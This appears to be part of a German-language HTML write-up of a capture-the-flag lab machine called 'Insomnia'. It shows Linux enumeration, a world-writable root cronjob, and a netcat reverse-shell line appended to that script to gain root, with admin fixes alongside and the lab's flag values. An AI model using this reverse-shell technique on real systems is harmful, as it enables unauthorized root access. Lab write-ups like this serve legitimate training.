+Flag : [<span class="password">c2e285cb33cecdbeb83d2189e983a8c0</span>]
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (Julia zu Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Als `julia` wird `sudo -l` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `julia` benötigt ein Passwort für `sudo`. `sudo` ist somit kein direkter Vektor von hier aus.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach anderen Vektoren: SUID, Cronjobs, Kernel-Exploits, Konfigurationsfehler.<br><strong>Empfehlung (Admin):</strong> Korrekte `sudo`-Konfiguration für diesen Benutzer.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+julia@insomnia:~$ <span class="command">sudo -l</span>
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for julia: <!-- Passwort benötigt -->
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Systeminformationen werden gesammelt (`/etc/*rel*`, `uname`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt Debian 10 (Buster) und Kernel 4.19. Dies könnte für die Suche nach Kernel-Exploits relevant sein, aber oft gibt es einfachere Wege.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren, aber zuerst nach einfacheren Vektoren suchen.<br><strong>Empfehlung (Admin):</strong> System aktuell halten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+julia@insomnia:~$ <span class="command">cat /etc/*rel*</span>
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+julia@insomnia:~$ <span class="command">uname -a</span>
+Linux insomnia 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
+julia@insomnia:~$ <span class="command">uname -r</span>
+4.19.0-12-amd64
+julia@insomnia:~$ <span class="command">uname -m</span>
+x86_64
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird nach SUID-Binaries gesucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden nur Standard-SUID-Binaries gefunden. Kein offensichtlicher Eskalationsvektor hier.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche Cronjobs oder andere Konfigurationen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+julia@insomnia:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+    17173     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+    28978     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    32504    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+      279     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
+      278     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
+      281     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
+    42484    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo
+     4059     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
+      282     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
+      257     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
+     4061     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
+     3826     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Netzwerk-Sockets werden mit `ss -tulpen` überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass nur Port 8080 (von Prozess mit UID 33, www-data) und Port 68 (DHCP-Client) lauschen. Keine versteckten Dienste.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche Cronjobs.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+julia@insomnia:/var/www$ <span class="command">ss -tulpen</span>
+Netid  State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
+udp    UNCONN   0        0                0.0.0.0:68             0.0.0.0:*      users:(("dhclient",pid=XXX,fd=X)) ino:13546 sk:1 <->
+tcp    LISTEN   0        128              0.0.0.0:8080           0.0.0.0:*      users:(("php",pid=XXX,fd=X)) uid:33 ino:14222 sk:2 <->
+                     </pre> <!-- PID/FD hinzugefügt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die System-Crontab (`/etc/crontab`) wird angezeigt. Anschließend werden die Berechtigungen des darin referenzierten Skripts `/var/cron/check.sh` geprüft.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalationsvektor gefunden!!** Die Crontab zeigt, dass `/bin/bash /var/cron/check.sh` **jede Minute** als **root** ausgeführt wird. Die Dateiberechtigungen von `check.sh` sind `-rwxrwxrwx` (777), was bedeutet, dass **jeder Benutzer** das Skript ändern kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Hänge einen Reverse-Shell-Payload an `/var/cron/check.sh` an. Starte einen Listener auf dem entsprechenden Port und warte maximal eine Minute, bis der Cronjob die Shell auslöst.<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere die Berechtigungen von `/var/cron/check.sh` (`chmod 755`, `chown root:root`). Überprüfe alle Cronjobs auf unsichere Berechtigungen oder Skripte.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+julia@insomnia:~$ <span class="command">cat /etc/crontab</span>
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /bin/bash /var/cron/check.sh <!-- !!! Root Cronjob !!! -->
+julia@insomnia:~$ <span class="command">cd /var/cron</span>
+julia@insomnia:/var/cron$ <span class="command">ls -la | grep check.sh</span>
+-rwxrwxrwx  1 root root  153 Dec 21 04:17 check.sh <!-- !!! World-Writable !!! -->
+                      </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 4447 gestartet. Anschließend wird ein Netcat-Reverse-Shell-Befehl an die Datei `/var/cron/check.sh` angehängt (`>>`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Exploit wird vorbereitet. Der `>>` Operator stellt sicher, dass der ursprüngliche Inhalt des Skripts nicht überschrieben wird (obwohl das hier wahrscheinlich egal wäre).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warte maximal eine Minute auf die eingehende Verbindung.<br><strong>Empfehlung (Admin):</strong> Korrigiere die Berechtigungen.</p>
+              <!-- Listener -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4447</span></div>
+                     <pre>
+listening on [any] 4447 ...
+                     </pre>
+                 </div>
+             </div>
+              <!-- Append Payload -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+julia@insomnia:/var/cron$ <span class="command"> echo 'nc -e /bin/sh 192.168.2.121 4447' >> check.sh</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf Port 4447 empfängt die Verbindung, die durch den minütlichen Cronjob ausgelöst wurde.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Cronjob hat das modifizierte `check.sh` als `root` ausgeführt und die Reverse Shell gestartet. Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Korrigiere die Dateiberechtigungen von `/var/cron/check.sh`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4447</span></div>
+                     <pre>
+listening on [any] 4447 ...
+connect to [192.168.2.121] from (UNKNOWN) [192.168.2.111] 34094
+<!-- Kein Prompt hier, direkter Befehl --> <span class="command">id</span>
+uid=0(root) gid=0(root) groups=0(root)
+                     </pre> <!-- Root Shell erlangt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird die Root-Flag gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Root-Flag `<span class="password">c84baebe0faa2fcdc2f1a4a9f6e2fbfc</span>` erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+# <span class="command">ls</span>
+root.txt
+# <span class="command">cat root.txt</span>
+
+~\
+ROOTED INSMNIA <!-- Name geändert -->
+~
+Flag : [<span class="password">c84baebe0faa2fcdc2f1a4a9f6e2fbfc</span>]
+
+by Alienum with <3 <!-- Maskierung -->
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">c84baebe0faa2fcdc2f1a4a9f6e2fbfc</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/julia/user.txt</div> <!-- Pfad hinzugefügt -->
+                     <div class="flag-value"><span class="password">c2e285cb33cecdbeb83d2189e983a8c0</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap/Nikto Scan extrahiert -->
+        <p>Berichtsdatum: 4. November 2022</p>
+    </footer>
+</body>
+</html>
